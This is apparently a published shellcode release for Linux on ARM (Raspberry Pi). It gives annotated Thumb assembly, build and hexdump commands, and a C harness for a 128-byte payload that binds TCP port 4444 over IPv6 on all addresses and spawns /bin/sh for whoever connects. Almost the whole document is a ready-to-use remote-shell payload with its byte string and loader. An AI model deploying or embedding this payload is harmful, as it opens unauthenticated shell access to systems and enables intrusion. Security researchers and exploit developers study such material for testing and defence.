/*
Title:  Linux/ARM - IPv6 4444/TCP Bind Shellcode (128 Bytes)
Date:   2018-07-25
Tested: armv7l (Raspberry Pi 3 Model B+)
Author: Ken Kitahara

pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $ cat bindshell-ipv6.s
.section .text
.global _start

_start:
    .ARM
    add  r3, pc, #1
    bx   r3

    .THUMB
    // socket(AF_INET6, SOCK_STREAM, IPPROTO_IP)
    mov  r0, #10
    mov  r1, #1
    eor  r2, r2, r2
    mov  r7, #100
    add  r7, r7, #181
    svc  #1
    // save fd
    mov  r4, r0

    // bind(fd, &sockaddr, 28)
    adr  r1, struct_addr
    // replace 0xff with NULL and set sin6_family to 0x0a (AF_INET6)
    strb r2, [r1, #1]
    // replace 1 with NULL and set sin6_flowinfo to NULL
    str  r2, [r1, #4]
    // replace 1 with NULL and set sin6_addr to ::
    str  r2, [r1, #8]
    str  r2, [r1, #12]
    str  r2, [r1, #16]
    str  r2, [r1, #20]
    // replace 1 with NULL and set sin6_scope_id to NULL
    str  r2, [r1, #24]
    mov  r2, #28
    add  r7, r7, #1
    svc  #1

    // listen(host_sockid, 2)
    mov  r0, r4
    mov  r1, #2
    add  r7, r7, #2
    svc  #1

    // accept(host_sockid, 0, 0)
    mov  r0, r4
    eor  r1, r1, r1
    eor  r2, r2, r2
    add  r7, r7, #1
    svc  #1
    // save fd
    mov  r4, r0

    // dup2(client_sockid, 0)
    mov  r7, #63
    svc  #1

    // dup2(client_sockid, 1)
    mov  r0, r4
    add  r1, r1, #1
    svc  #1

    // dup2(client_sockid, 2)
    mov  r0, r4
    add  r1, r1, #1
    svc  #1

    // execve("/bin/sh", 0, 0)
    eor  r1, r1, r1
    eor  r2, r2, r2
    adr  r0, spawn
    strb r2, [r0, #7]
    mov  r7, #11
    svc  #1

spawn:
.ascii "/bin/shA"

struct_addr:
.ascii "\x0a\xff" // sin6_family -> AF_INET6
.ascii "\x11\x5c" // sin6_port -> 4444
.byte  1,1,1,1    // sin6_flowinfo -> NULL
.byte  1,1,1,1    // sin6_addr -> ::
.byte  1,1,1,1
.byte  1,1,1,1
.byte  1,1,1,1
.byte  1,1,1,1    // sin6_scope_id -> NULL

pi@raspberrypi:~ $ as -o bindshell-ipv6.o bindshell-ipv6.s && ld -N -o bindshell-ipv6 bindshell-ipv6.o
pi@raspberrypi:~ $ objcopy -O binary bindshell-ipv6 bindshell-ipv6.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' bindshell-ipv6.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x0a\x20\x01\x21\x52\x40\x64\x27\xb5\x37\x01\xdf\x04\x1c\x13\xa1\x4a\x70\x4a\x60\x8a\x60\xca\x60\x0a\x61\x4a\x61\x8a\x61\x1c\x22\x01\x37\x01\xdf\x20\x1c\x02\x21\x02\x37\x01\xdf\x20\x1c\x49\x40\x52\x40\x01\x37\x01\xdf\x04\x1c\x3f\x27\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x49\x40\x52\x40\x01\xa0\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41\x0a\xff\x11\x5c\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01

*/

#include<stdio.h>
#include<string.h>

unsigned char sc[] = \
"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
"\x0a\x20\x01\x21\x52\x40\x64\x27"
"\xb5\x37\x01\xdf\x04\x1c\x13\xa1"
"\x4a\x70\x4a\x60\x8a\x60\xca\x60"
"\x0a\x61\x4a\x61\x8a\x61\x1c\x22"
"\x01\x37\x01\xdf\x20\x1c\x02\x21"
"\x02\x37\x01\xdf\x20\x1c\x49\x40"
"\x52\x40\x01\x37\x01\xdf\x04\x1c"
"\x3f\x27\x01\xdf\x20\x1c\x01\x31"
"\x01\xdf\x20\x1c\x01\x31\x01\xdf"
"\x49\x40\x52\x40\x01\xa0\xc2\x71"
"\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
"\x2f\x73\x68\x41\x0a\xff\x11\x5c"
"\x01\x01\x01\x01\x01\x01\x01\x01"
"\x01\x01\x01\x01\x01\x01\x01\x01"
"\x01\x01\x01\x01\x01\x01\x01\x01";

void main()
{
    printf("Shellcode Length: %d\n", strlen(sc));

    int (*ret)() = (int(*)())sc;

    ret();
}